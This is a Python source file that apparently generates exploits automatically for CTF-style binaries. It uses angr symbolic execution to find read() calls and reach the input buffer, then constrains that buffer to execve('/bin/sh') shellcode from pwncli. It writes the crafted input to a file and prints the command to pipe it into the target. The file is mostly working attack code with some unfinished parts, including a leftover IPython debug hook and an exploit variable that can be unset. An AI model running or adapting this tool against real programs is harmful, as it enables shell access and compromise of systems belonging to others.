import angr
import claripy
import pwncli
import logging
import r2pipe
import os

l=logging.getLogger(__name__)

def find_plt_address(binary_path, function_name):
    # 创建一个Angr项目，加载二进制文件
    project = angr.Project(binary_path, load_options={'auto_load_libs': False})

    # 解析二进制文件的ELF头部
    elf = project.loader.main_object

    # 获取函数的PLT地址
    plt_address = elf.plt.get(function_name)
    
    return plt_address

def find_read_calls(binary_path):
    # 创建一个Angr项目，加载二进制文件
    project = angr.Project(binary_path, load_options={'auto_load_libs': False})

    # 创建一个符号执行引擎，分析控制流图
    cfg = project.analyses.CFGFast()

    # 获取所有调用read函数的地址
    read_calls = []
    for addr, func in cfg.kb.functions.items():
        for block in func.blocks:
            for insn in block.capstone.insns:
                if insn.mnemonic == "call":
                    if str(hex(find_plt_address(binary_path,'read'))) in insn.op_str:
                        read_calls.append(insn.address)

    return read_calls

def find_read_state(binary_path,read_call_addresses):
    read_states = []
    p = angr.Project(binary_path)
    es = p.factory.entry_state()
    sm = p.factory.simulation_manager(es)
    for addr in read_call_addresses:
        sm.explore(find=addr)
        read_state = sm.one_found
        read_states.append(read_state)
    return read_states


def check_memory_permissions(binary_path, address):
    # 创建一个Angr项目，加载二进制文件
    project = angr.Project(binary_path, load_options={'auto_load_libs': False})

    # 获取地址所在的段信息
    for segment in project.loader.main_object.segments:
        if segment.contains_addr(address):
            permissions = segment.permissions
            break
    else:
        permissions = 0  # 如果找不到地址所在的段，默认权限为0

    # 将权限转换为可读的字符串表示
    permissions_str = ""
    if permissions & 1:  # 1表示可读
        permissions_str += "R"
    if permissions & 2:  # 2表示可写
        permissions_str += "W"
    if permissions & 4:  # 4表示可执行
        permissions_str += "X"
    import IPython
    IPython.embed()
    return permissions_str.strip()

def getShellcode(properties):
    arch = properties["arch"]
    if 'i386' in arch:
        shellcode=pwncli.ShellcodeMall.i386.execve_bin_sh
    elif 'amd64' in arch:
        shellcode=pwncli.ShellcodeMall.amd64.execve_bin_sh
    return shellcode
        

def exp(binary_path,properties):
    p = angr.Project(binary_path, load_options={'auto_load_libs': False})
    shellcode=getShellcode(properties)
    read_call_addresses = find_read_calls(binary_path)
    read_states = find_read_state(binary_path,read_call_addresses)
    # RWX_addrs = []
    # for addr in buf_addrs:
    #     if "RWX" in check_memory_permissions(binary_path,addr):
    #         RWX_addrs.append(addr)
    for state in read_states:
        addr = state.regs.rsi.args[0]
        sc = claripy.BVS('sc', 32*16)
        state.memory.store(addr, sc)
        sm = p.factory.simgr(state)
        sm.explore(find=addr)
        if len(sm.found) > 0:
            ep = sm.found[0]
            ep.add_constraints(ep.memory.load(addr,0x1b)==shellcode)
            break

    binary_name = os.path.basename(binary_path)
    filename = '%s-exploit' % binary_name
    with open(filename, 'wb') as f:
        f.write(ep.posix.dumps(0))
    print("%s exploit in %s" % (binary_name, filename))
    print("run with `(cat %s; cat -) | %s`" % (filename, binary_path))
    return 1
            
        #     memory = ep.memory.load(buf_addr, len(shellcode))
        # sc_bvv = ep.solver.BVV(shellcode)